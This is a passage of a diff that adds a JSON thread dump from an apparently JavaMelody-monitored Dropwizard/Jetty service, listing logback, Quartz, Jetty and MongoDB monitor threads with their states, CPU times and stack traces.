+        "name": "AsyncAppender-Worker-async-file-appender",
+        "id": 25,
+        "priority": 5,
+        "daemon": true,
+        "state": "WAITING",
+        "cpuTimeMillis": 10393235,
+        "userTimeMillis": 5904850,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_25",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)",
+          "java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:403)",
+          "ch.qos.logback.core.AsyncAppenderBase$Worker.run(AsyncAppenderBase.java:264)"
+        ]
+      },
+      {
+        "name": "Finalizer",
+        "id": 3,
+        "priority": 8,
+        "daemon": true,
+        "state": "WAITING",
+        "cpuTimeMillis": 6009,
+        "userTimeMillis": 3350,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_3",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143)",
+          "java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:164)",
+          "java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:209)"
+        ]
+      },
+      {
+        "name": "dw-admin-60",
+        "id": 60,
+        "priority": 5,
+        "daemon": false,
+        "state": "RUNNABLE",
+        "cpuTimeMillis": 0,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_60",
+        "stackTrace": [
+          "sun.nio.ch.EPollArrayWrapper.epollWait(Native Method)",
+          "sun.nio.ch.EPollArrayWrapper.poll(EPollArrayWrapper.java:269)",
+          "sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:93)",
+          "sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:101)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.select(ManagedSelector.java:234)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.produce(ManagedSelector.java:187)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:211)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:126)",
+          "org.eclipse.jetty.io.ManagedSelector$$Lambda$80/1693233620.run(Unknown Source)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-102000",
+        "id": 102000,
+        "priority": 5,
+        "daemon": false,
+        "state": "RUNNABLE",
+        "cpuTimeMillis": 8307,
+        "userTimeMillis": 7560,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_102000",
+        "stackTrace": [
+          "java.lang.Thread.dumpThreads(Native Method)",
+          "java.lang.Thread.getAllStackTraces(Thread.java:1607)",
+          "net.bull.javamelody.JavaInformations.buildThreadInformationsList(JavaInformations.java:311)",
+          "net.bull.javamelody.JavaInformations.<init>(JavaInformations.java:181)",
+          "net.bull.javamelody.MonitoringController.doActionIfNeededAndReport(MonitoringController.java:166)",
+          "net.bull.javamelody.MonitoringFilter.doMonitoring(MonitoringFilter.java:384)",
+          "net.bull.javamelody.MonitoringFilter.doFilter(MonitoringFilter.java:193)",
+          "org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1637)",
+          "org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:533)",
+          "org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:188)",
+          "org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1253)",
+          "org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:168)",
+          "org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:473)",
+          "org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:166)",
+          "org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1155)",
+          "org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)",
+          "org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)",
+          "com.codahale.metrics.jetty9.InstrumentedHandler.handle(InstrumentedHandler.java:241)",
+          "io.dropwizard.jetty.RoutingHandler.handle(RoutingHandler.java:52)",
+          "org.eclipse.jetty.server.handler.gzip.GzipHandler.handle(GzipHandler.java:521)",
+          "io.dropwizard.jetty.BiDiGzipHandler.handle(BiDiGzipHandler.java:68)",
+          "org.eclipse.jetty.server.handler.RequestLogHandler.handle(RequestLogHandler.java:56)",
+          "org.eclipse.jetty.server.handler.StatisticsHandler.handle(StatisticsHandler.java:169)",
+          "org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)",
+          "org.eclipse.jetty.server.Server.handle(Server.java:564)",
+          "org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:317)",
+          "org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)",
+          "org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)",
+          "org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:110)",
+          "org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)",
+          "org.eclipse.jetty.util.thread.Invocable.invokePreferred(Invocable.java:128)",
+          "org.eclipse.jetty.util.thread.Invocable$InvocableExecutor.invoke(Invocable.java:222)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:294)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:199)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "logback-7",
+        "id": 10771,
+        "priority": 5,
+        "daemon": true,
+        "state": "WAITING",
+        "cpuTimeMillis": 1007,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_10771",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1081)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809)",
+          "java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)",
+          "java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)",
+          "java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "logback-6",
+        "id": 7898,
+        "priority": 5,
+        "daemon": true,
+        "state": "WAITING",
+        "cpuTimeMillis": 1191,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_7898",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1081)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809)",
+          "java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)",
+          "java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)",
+          "java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "DefaultQuartzScheduler_Worker-1",
+        "id": 43,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 217924,
+        "userTimeMillis": 115680,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_43",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:552)"
+        ]
+      },
+      {
+        "name": "DefaultQuartzScheduler_Worker-7",
+        "id": 49,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 215900,
+        "userTimeMillis": 117590,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_49",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:552)"
+        ]
+      },
+      {
+        "name": "DefaultQuartzScheduler_Worker-9",
+        "id": 51,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 217342,
+        "userTimeMillis": 115580,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_51",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:552)"
+        ]
+      },
+      {
+        "name": "DefaultQuartzScheduler_Worker-4",
+        "id": 46,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 218319,
+        "userTimeMillis": 116720,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_46",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:552)"
+        ]
+      },
+      {
+        "name": "logback-8",
+        "id": 10772,
+        "priority": 5,
+        "daemon": true,
+        "state": "WAITING",
+        "cpuTimeMillis": 975,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_10772",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1081)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809)",
+          "java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)",
+          "java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)",
+          "java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "logback-3",
+        "id": 5022,
+        "priority": 5,
+        "daemon": true,
+        "state": "WAITING",
+        "cpuTimeMillis": 1127,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_5022",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1081)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809)",
+          "java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)",
+          "java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)",
+          "java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "DefaultQuartzScheduler_Worker-6",
+        "id": 48,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 216356,
+        "userTimeMillis": 115920,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_48",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:552)"
+        ]
+      },
+      {
+        "name": "cluster-ClusterId{value='5afcc10f361bcef665058f86', description='null'}-10.140.78.149:27020",
+        "id": 28,
+        "priority": 5,
+        "daemon": true,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 108243,
+        "userTimeMillis": 86610,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_28",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078)",
+          "com.mongodb.connection.DefaultServerMonitor$ServerMonitorRunnable.waitForSignalOrTimeout(DefaultServerMonitor.java:238)",
+          "com.mongodb.connection.DefaultServerMonitor$ServerMonitorRunnable.waitForNext(DefaultServerMonitor.java:219)",
+          "com.mongodb.connection.DefaultServerMonitor$ServerMonitorRunnable.run(DefaultServerMonitor.java:168)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-admin-66-acceptor-3@5728452d-admin@3868468e{HTTP/1.1,[http/1.1]}{0.0.0.0:8082}",
+        "id": 66,
+        "priority": 3,
+        "daemon": false,
+        "state": "BLOCKED",
+        "cpuTimeMillis": 0,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_66",
+        "stackTrace": [
+          "sun.nio.ch.ServerSocketChannelImpl.accept(ServerSocketChannelImpl.java:234)",
+          "org.eclipse.jetty.server.ServerConnector.accept(ServerConnector.java:352)",
+          "org.eclipse.jetty.server.AbstractConnector$Acceptor.run(AbstractConnector.java:603)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-102032",
+        "id": 102032,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 1547,
+        "userTimeMillis": 1390,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_102032",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078)",
+          "org.eclipse.jetty.util.BlockingArrayQueue.poll(BlockingArrayQueue.java:392)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.idleJobPoll(QueuedThreadPool.java:565)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.access$800(QueuedThreadPool.java:50)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:628)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-102014",
+        "id": 102014,
+        "priority": 5,
+        "daemon": false,
+        "state": "RUNNABLE",
+        "cpuTimeMillis": 5736,
+        "userTimeMillis": 5170,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_102014",
+        "stackTrace": [
+          "sun.nio.ch.EPollArrayWrapper.epollWait(Native Method)",
+          "sun.nio.ch.EPollArrayWrapper.poll(EPollArrayWrapper.java:269)",
+          "sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:93)",
+          "sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:101)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.select(ManagedSelector.java:234)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.produce(ManagedSelector.java:187)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:211)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:199)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-admin-62",
+        "id": 62,
+        "priority": 5,
+        "daemon": false,
+        "state": "RUNNABLE",
+        "cpuTimeMillis": 0,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_62",
+        "stackTrace": [
+          "sun.nio.ch.EPollArrayWrapper.epollWait(Native Method)",
+          "sun.nio.ch.EPollArrayWrapper.poll(EPollArrayWrapper.java:269)",
+          "sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:93)",
+          "sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:101)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.select(ManagedSelector.java:234)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.produce(ManagedSelector.java:187)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:211)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:126)",
+          "org.eclipse.jetty.io.ManagedSelector$$Lambda$80/1693233620.run(Unknown Source)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "DefaultQuartzScheduler_Worker-3",
+        "id": 45,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 213119,
+        "userTimeMillis": 113880,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_45",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:552)"
+        ]
+      },
+      {
+        "name": "dw-admin-102037",
+        "id": 102037,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 0,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_102037",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078)",
+          "org.eclipse.jetty.util.BlockingArrayQueue.poll(BlockingArrayQueue.java:392)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.idleJobPoll(QueuedThreadPool.java:565)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.access$800(QueuedThreadPool.java:50)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:628)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "DefaultQuartzScheduler_Worker-10",
+        "id": 52,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 215230,
+        "userTimeMillis": 115130,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_52",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:552)"
+        ]
+      },
+      {
+        "name": "dw-101961",
+        "id": 101961,
+        "priority": 5,
+        "daemon": false,
+        "state": "RUNNABLE",
+        "cpuTimeMillis": 16783,
+        "userTimeMillis": 15300,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_101961",
+        "stackTrace": [
+          "sun.nio.ch.EPollArrayWrapper.epollWait(Native Method)",
+          "sun.nio.ch.EPollArrayWrapper.poll(EPollArrayWrapper.java:269)",
+          "sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:93)",
+          "sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:101)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.select(ManagedSelector.java:234)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.produce(ManagedSelector.java:187)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:211)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:199)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "logback-4",
+        "id": 5023,
+        "priority": 5,
+        "daemon": true,
+        "state": "WAITING",
+        "cpuTimeMillis": 1057,
+        "userTimeMillis": 0,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_5023",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1081)",
+          "java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809)",
+          "java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)",
+          "java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)",
+          "java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "DefaultQuartzScheduler_Worker-8",
+        "id": 50,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 217321,
+        "userTimeMillis": 116940,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_50",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:552)"
+        ]
+      },
+      {
+        "name": "dw-102004",
+        "id": 102004,
+        "priority": 5,
+        "daemon": false,
+        "state": "WAITING",
+        "cpuTimeMillis": 8078,
+        "userTimeMillis": 7370,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_102004",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:173)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-40-acceptor-2@3eb9f40a-application@368022b9{HTTP/1.1,[http/1.1]}{0.0.0.0:9092}",
+        "id": 40,
+        "priority": 3,
+        "daemon": false,
+        "state": "BLOCKED",
+        "cpuTimeMillis": 1769604,
+        "userTimeMillis": 745430,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_40",
+        "stackTrace": [
+          "sun.nio.ch.ServerSocketChannelImpl.accept(ServerSocketChannelImpl.java:233)",
+          "org.eclipse.jetty.server.ServerConnector.accept(ServerConnector.java:352)",
+          "org.eclipse.jetty.server.AbstractConnector$Acceptor.run(AbstractConnector.java:603)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-102001",
+        "id": 102001,
+        "priority": 5,
+        "daemon": false,
+        "state": "RUNNABLE",
+        "cpuTimeMillis": 8330,
+        "userTimeMillis": 7580,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_102001",
+        "stackTrace": [
+          "sun.nio.ch.EPollArrayWrapper.epollWait(Native Method)",
+          "sun.nio.ch.EPollArrayWrapper.poll(EPollArrayWrapper.java:269)",
+          "sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:93)",
+          "sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97)",
+          "sun.nio.ch.SelectorImpl.select(SelectorImpl.java:101)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.select(ManagedSelector.java:234)",
+          "org.eclipse.jetty.io.ManagedSelector$SelectorProducer.produce(ManagedSelector.java:187)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:211)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:199)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "DefaultQuartzScheduler_Worker-2",
+        "id": 44,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 218818,
+        "userTimeMillis": 118830,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_44",
+        "stackTrace": [
+          "java.lang.Object.wait(Native Method)",
+          "org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:552)"
+        ]
+      },
+      {
+        "name": "dw-102026",
+        "id": 102026,
+        "priority": 5,
+        "daemon": false,
+        "state": "WAITING",
+        "cpuTimeMillis": 2907,
+        "userTimeMillis": 2660,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_102026",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)",
+          "org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:173)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:673)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:591)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-102013",
+        "id": 102013,
+        "priority": 5,
+        "daemon": false,
+        "state": "TIMED_WAITING",
+        "cpuTimeMillis": 5709,
+        "userTimeMillis": 5180,
+        "deadlocked": false,
+        "globalThreadId": "63077_10.140.39.112_102013",
+        "stackTrace": [
+          "sun.misc.Unsafe.park(Native Method)",
+          "java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215)",
+          "java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078)",
+          "org.eclipse.jetty.util.BlockingArrayQueue.poll(BlockingArrayQueue.java:392)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.idleJobPoll(QueuedThreadPool.java:565)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool.access$800(QueuedThreadPool.java:50)",
+          "org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:628)",
+          "java.lang.Thread.run(Thread.java:745)"
+        ]
+      },
+      {
+        "name": "dw-admin-64-acceptor-1@5920e018-admin@3868468e{HTTP/1.1,[http/1.1]}{0.0.0.0:8082}",
+        "id": 64,
+        "priority": 3,
+        "daemon": false,
+        "state": "BLOCKED",
